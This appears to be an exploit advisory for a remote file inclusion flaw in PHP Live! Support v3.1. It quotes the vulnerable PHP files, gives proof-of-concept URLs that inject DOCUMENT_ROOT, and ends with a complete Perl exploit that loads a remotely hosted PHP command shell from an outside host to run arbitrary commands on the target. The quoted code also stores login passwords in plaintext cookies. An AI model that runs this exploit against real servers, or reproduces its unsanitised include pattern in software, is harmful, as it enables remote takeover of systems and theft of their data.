OSI Codes PHP Live! Support v3.1 Remote File Inclusion Vulnerability
====================================================================

#####
#    * Provide Live Support on your Website
#    * Increase your Sales
#    * Increase Customer Satisfaction
#    * Decrease your phone/operational costs
# [?] Usage :
# perl tux.pl <target> <weapon url> cmd
# perl tux.pl http://server/path/ http://www.host.org/shell.txt cmd
# Weapon example: <?php system($_GET[&#039;cmd&#039;]); ?>
#####
<!--more-->
# [-] Bugs in
 
[+] index.php
<?php
    /*******************************************************
    * COPYRIGHT OSI CODES - PHP Live!
    *******************************************************/
    session_start() ;
    $l = "" ;
    // try to get cookie value first
    if ( isset( $_COOKIE[&#039;COOKIE_PHPLIVE_SITE&#039;] ) ) { $l = $_COOKIE[&#039;COOKIE_PHPLIVE_SITE&#039;] ; }
    if ( isset( $_GET[&#039;l&#039;] ) ) { $l = $_GET[&#039;l&#039;] ; }
    if ( isset( $_POST[&#039;l&#039;] ) ) { $l = $_POST[&#039;l&#039;] ; }
 
    if ( !file_exists( "./web/conf-init.php" ) )
    {
        HEADER( "location: setup/index.php" ) ;
        exit ;
    }
     
    include_once( "./API/Util_Dir.php" ) ;
    if ( Util_DIR_CheckDir( ".", $l ) )
        include_once("./web/$l/$l-conf-init.php") ;
    include_once("./web/conf-init.php") ;
    include_once("$DOCUMENT_ROOT/API/Util_Error.php") ;
    include_once("$DOCUMENT_ROOT/system.php") ;
    include_once("$DOCUMENT_ROOT/lang_packs/$LANG_PACK.php") ;
    include_once("$DOCUMENT_ROOT/web/VERSION_KEEP.php") ;
    include_once("$DOCUMENT_ROOT/API/Util_CleanFiles.php") ;
    include_once("$DOCUMENT_ROOT/API/sql.php" ) ;
    include_once("$DOCUMENT_ROOT/API/Users/get.php") ;
    include_once("$DOCUMENT_ROOT/API/Users/update.php") ;
    include_once("$DOCUMENT_ROOT/API/Chat/remove.php") ;
    include_once("$DOCUMENT_ROOT/API/ASP/get.php") ;
 
    // initialize
    $action = $error = $sid = $site = $remember = "" ;
    $sound_file = "cellular.wav" ;
    $isadmin = $winapp = $autologin = $wflag = $closewin = 0 ;
 
    if ( !isset( $_SESSION[&#039;session_admin&#039;] ) )
    {
        session_register( "session_admin" ) ;
        $session_admin = ARRAY() ;
        $_SESSION[&#039;session_admin&#039;] = ARRAY() ;
    }
 
    // check to see if the site login is passes.  if not, then let&#039;s see how many
    // sites are in the asp model.  if only ONE, then default to that one.
    $total_sites = AdminASP_get_TotalUsers( $dbh ) ;
    if ( $total_sites == 1 )
    {
        $site = AdminASP_get_AllUsers( $dbh, 0, 1 ) ;
        $l = $site[0][&#039;login&#039;] ;
    }
 
    if ( isset( $LOGO ) && file_exists( "$DOCUMENT_ROOT/web/$l/$LOGO" ) && $LOGO )
        $logo = "$BASE_URL/web/$l/$LOGO" ;
    else if ( file_exists( "$DOCUMENT_ROOT/web/$LOGO_ASP" ) && $LOGO_ASP )
        $logo = "$BASE_URL/web/$LOGO_ASP" ;
    else
        $logo = "$BASE_URL/images/logo.gif" ;
 
    // get variables
    if ( isset( $_POST[&#039;action&#039;] ) ) { $action = $_POST[&#039;action&#039;] ; }
    if ( isset( $_GET[&#039;action&#039;] ) ) { $action = $_GET[&#039;action&#039;] ; }
    if ( isset( $_POST[&#039;winapp&#039;] ) ) { $winapp = $_POST[&#039;winapp&#039;] ; }
    if ( isset( $_GET[&#039;winapp&#039;] ) ) { $winapp = $_GET[&#039;winapp&#039;] ; }
    if ( isset( $_GET[&#039;wflag&#039;] ) ) { $wflag = $_GET[&#039;wflag&#039;] ; }
    if ( isset( $_GET[&#039;closewin&#039;] ) && ( $_GET[&#039;closewin&#039;] != "undefined" ) ) { $closewin = $_GET[&#039;closewin&#039;] ; }
 
    // conditions
    if ( ( isset( $_COOKIE[&#039;COOKIE_PHPLIVE_LOGIN&#039;] ) && isset( $_COOKIE[&#039;COOKIE_PHPLIVE_PASSWORD&#039;] ) && isset( $_COOKIE[&#039;COOKIE_PHPLIVE_SITE&#039;] ) ) && !$action )
        $autologin = 1 ;
 
    if ( $action == "login" )
    {
        if ( $l )
            $site = $l ;
        else
            $site = $_POST[&#039;site&#039;] ;
 
        $aspinfo = AdminASP_get_ASPInfoByASPLogin( $dbh, $site ) ;
        $admin = AdminUsers_get_UserInfoByLoginPass( $dbh, $_POST[&#039;login&#039;], $_POST[&#039;password&#039;], $aspinfo[&#039;aspID&#039;] ) ;
 
        if ( !$aspinfo[&#039;active_status&#039;] )
            $error = "Servi?o est? inativo. Entre em contato com o administrador para obter detalhes setup." ;
        else
        {
            if ( $admin[&#039;userID&#039;] && ( $admin[&#039;aspID&#039;] == $aspinfo[&#039;aspID&#039;] ) )
            {
                CleanFiles_util_CleanChatSessionFiles() ;
 
                // set $sid.  $sid is used to keep track of this admin user.  $sid allows
                // so a user can log into several admin departments on same computer.  it is
                // passed everywhere the admin goes.
                $sid = time() ;
 
                $departments = AdminUsers_get_UserDepartments( $dbh, $admin[&#039;userID&#039;] ) ;
                $dept_string = "" ;
                for ( $c = 0; $c < count( $departments ); ++$c )
                {
                    $the_department = $departments[$c] ;
                    $dept_string .= "deptID = $the_department[deptID] OR " ;
                }
                $dept_string .= "deptID = 0" ;
 
                $_SESSION[&#039;session_admin&#039;][$sid] = ARRAY() ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;dept_string&#039;] = $dept_string ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;admin_id&#039;] = $admin[&#039;userID&#039;] ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;requests&#039;] = 0 ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;aspID&#039;] = $aspinfo[&#039;aspID&#039;] ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;asp_login&#039;] = $aspinfo[&#039;login&#039;] ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;active_footprints&#039;] = 0 ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;winapp&#039;] = "$winapp" ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;close_timer&#039;] = 0 ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;traffic_monitor&#039;] = 0 ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;available_status&#039;] = 1 ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;sound&#039;] = "on" ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;request_ids&#039;] = "" ;
                $_SESSION[&#039;session_admin&#039;][$sid][&#039;traffic_timer&#039;] = $admin[&#039;console_refresh&#039;] ;
                $isadmin = 1 ;
 
                // check to see if they want to be remembered... if so, just set cookie.
                // let&#039;s set it for 1 month for now.
                $cookie_lifespan = time() + 60*60*24*30 ;
                if ( isset( $_POST[&#039;remember&#039;] ) )
                {
                    setcookie( "COOKIE_PHPLIVE_LOGIN", $_POST[&#039;login&#039;], $cookie_lifespan ) ;
                    setcookie( "COOKIE_PHPLIVE_PASSWORD", $_POST[&#039;password&#039;], $cookie_lifespan ) ;
                    setcookie( "COOKIE_PHPLIVE_SITE", $aspinfo[&#039;login&#039;], $cookie_lifespan ) ;
                }
            }
            else
            {
                // reset cookie if cookies are set
                if ( isset( $_COOKIE[&#039;COOKIE_PHPLIVE_LOGIN&#039;] ) && isset( $_COOKIE[&#039;COOKIE_PHPLIVE_PASSWORD&#039;] ) )
                {
                    setcookie( "COOKIE_PHPLIVE_LOGIN", "", -1 ) ;
                    setcookie( "COOKIE_PHPLIVE_PASSWORD", "", -1 ) ;
                    setcookie( "COOKIE_PHPLIVE_SITE", "", -1 ) ;
                }
                $error = "Falha de Login.  Nota: sua senha ? (CaSE senSiTiVE)." ;
            }
        }
    }
    else if ( $action == "logout" )
    {
        if ( isset( $_COOKIE[&#039;COOKIE_PHPLIVE_LOGIN&#039;] ) && isset( $_COOKIE[&#039;COOKIE_PHPLIVE_PASSWORD&#039;] ) && !$wflag )
        {
            setcookie( "COOKIE_PHPLIVE_LOGIN", "", -1 ) ;
            setcookie( "COOKIE_PHPLIVE_PASSWORD", "", -1 ) ;
            setcookie( "COOKIE_PHPLIVE_SITE", "", -1 ) ;
        }
        $sid = $_GET[&#039;sid&#039;] ;
        $l = $_SESSION[&#039;session_admin&#039;][$sid][&#039;asp_login&#039;] ;
        AdminUsers_update_Status( $dbh, $_SESSION[&#039;session_admin&#039;][$sid][&#039;admin_id&#039;], 0 ) ;
        AdminUsers_update_UserValue( $dbh, $_SESSION[&#039;session_admin&#039;][$sid][&#039;admin_id&#039;], "last_active_time", $admin_idle - 300 ) ;
        $_SESSION[&#039;session_admin&#039;] = Array() ;
        HEADER( "location: index.php?wflag=$wflag&l=$l&winapp=$winapp&closewin=$closewin" ) ;
        exit ;
    }
    else
    {
        // do the cleaning of the chat database of old requests and sessions.
        ServiceChat_remove_CleanChatSessionList( $dbh ) ;
        ServiceChat_remove_CleanChatSessions( $dbh ) ;
        ServiceChat_remove_CleanChatRequests( $dbh ) ;
    }
?>
 
[+] chat.php
<?php
    /*******************************************************
    * COPYRIGHT OSI CODES - PHP Live!
    *******************************************************/
    session_start() ;
    $session_chat = $_SESSION[&#039;session_chat&#039;] ;
    $sid = ( isset( $_GET[&#039;sid&#039;] ) ) ? $_GET[&#039;sid&#039;] : "" ;
    $requestid = ( isset( $_GET[&#039;requestid&#039;] ) ) ? $_GET[&#039;requestid&#039;] : "" ;
    $sessionid = ( isset( $_GET[&#039;sessionid&#039;] ) ) ? $_GET[&#039;sessionid&#039;] : "" ;
    $userid = ( isset( $_GET[&#039;userid&#039;] ) ) ? $_GET[&#039;userid&#039;] : "" ;
    $action = ( isset( $_GET[&#039;action&#039;] ) ) ? $_GET[&#039;action&#039;] : "" ;
    if ( !file_exists( "web/".$session_chat[$sid][&#039;asp_login&#039;]."/".$session_chat[$sid][&#039;asp_login&#039;]."-conf-init.php" ) || !file_exists( "web/conf-init.php" ) )
    {
        print "<font color=\"#FF0000\">[Configuration Error: config files not found! -$sid] Exiting...</font>" ;
        exit ;
    }
    include_once("./web/conf-init.php") ;
    include_once("$DOCUMENT_ROOT/web/".$session_chat[$sid][&#039;asp_login&#039;]."/".$session_chat[$sid][&#039;asp_login&#039;]."-conf-init.php") ;
    include_once("$DOCUMENT_ROOT/system.php") ;
    include_once("$DOCUMENT_ROOT/lang_packs/$LANG_PACK.php") ;
    include_once("$DOCUMENT_ROOT/API/sql.php") ;
    include_once("$DOCUMENT_ROOT/API/Chat/update.php") ;
 
 
    // set frame row properties depending if admin or regular request
    $frame_row_properties = "*,100%" ;
    if ( $session_chat[$sid][&#039;isadmin&#039;] && $session_chat[$sid][&#039;deptid&#039;] )
        $frame_row_properties = "*,100%" ;
    // let&#039;s start the poll time
    $_SESSION[&#039;session_chat&#039;][$sid][&#039;admin_poll_time&#039;] = time() ;
?>
 
[+] help.php
<?php
    /*******************************************************
    * COPYRIGHT OSI CODES - PHP Live!
    *******************************************************/
    include_once("./web/conf-init.php");
    include_once("$DOCUMENT_ROOT/system.php") ;
    include_once("$DOCUMENT_ROOT/lang_packs/$LANG_PACK.php") ;
    include_once("$DOCUMENT_ROOT/web/VERSION_KEEP.php") ;
    include_once("$DOCUMENT_ROOT/API/sql.php") ;
 
    // initialize
    $action = "" ;
 
        $text_width = "12" ;
    else
        $text_width = "9" ;
 
    $success = 0 ;
    // update all admins status to not available if they have been idle
 
    // get variables
    if ( isset( $_POST[&#039;action&#039;] ) ) { $action = $_POST[&#039;action&#039;] ; }
    if ( isset( $_GET[&#039;action&#039;] ) ) { $action = $_GET[&#039;action&#039;] ; }
?>
 
 
[-] PoC
 
http://server/path/index.php?DOCUMENT_ROOT=
http://server/path/chat.php?DOCUMENT_ROOT=
http://server/path/help.php?DOCUMENT_ROOT=
 
[-] eXpL0!t c0des
 
#!/usr/bin/perl
 
use HTTP::Request;
use LWP::UserAgent;
$RoNz = $ARGV[0];
$Pathloader = $ARGV[1];
$Contrex = $ARGV[2];
if($RoNz!~/http:\/\// || $Pathloader!~/http:\/\// || !$Contrex){usage()}
head();
sub head()
 {
 print "[o]============================================================================[o]\r\n";
 print " |         PHP Live! Support v3.1 Multiple Remote File Include      |\r\n";
 print "[o]============================================================================[o]\r\n";
 }
while()
{
      print "[w00t] \$";
while(<STDIN>)
      {
              $kaMtiEz=$_;
              chomp($kaMtiEz);
$arianom = LWP::UserAgent->new() or die;
$tiw0L = HTTP::Request->new(GET =>$RoNz.&#039;help.php?DOCUMENT_ROOT=&#039;.$Pathloader.&#039;?&&#039;.$Contrex.&#039;=&#039;.$kaMtiEz)or die "\nCould Not connect\n";
$abah_benu = $arianom->request($tiw0L);
$tukulesto = $abah_benu->content;
$tukulesto =~ tr/[\n]/[?]/;
if (!$kaMtiEz) {print "\nPlease Enter a Command\n\n"; $tukulesto ="";}
elsif ($tukulesto =~/failed to open stream: HTTP request denied!/ || $tukulesto =~/: Cannot execute a blank command in /)
      {print "\nCann&#039;t Connect to cmd Host or Invalid Command\n";exit}
elsif ($tukulesto =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
if($tukulesto =~ /(.*)/)
{
      $finreturn = $1;
      $finreturn=~ tr/[?]/[\n]/;
      print "\r\n$finreturn\n\r";
      last;
}
else {print "[w00t] \$";}}}last;
sub usage()
 {
 head();
 print " | Usage:  perl tux.pl <target> <weapon url> <cmd>                |\r\n";
 print " | <Site> - Full path to execute ex: http://127.0.0.1/path/           |\r\n";
 print " | <Weapon url> - Path to Shell e.g http://www.indonesiancoder.org/shell.txt  |\r\n";
 print " | <cmd> - Command variable used in php shell                 |\r\n";
 print "[o]============================================================================[o]\r\n";
 exit();
 }


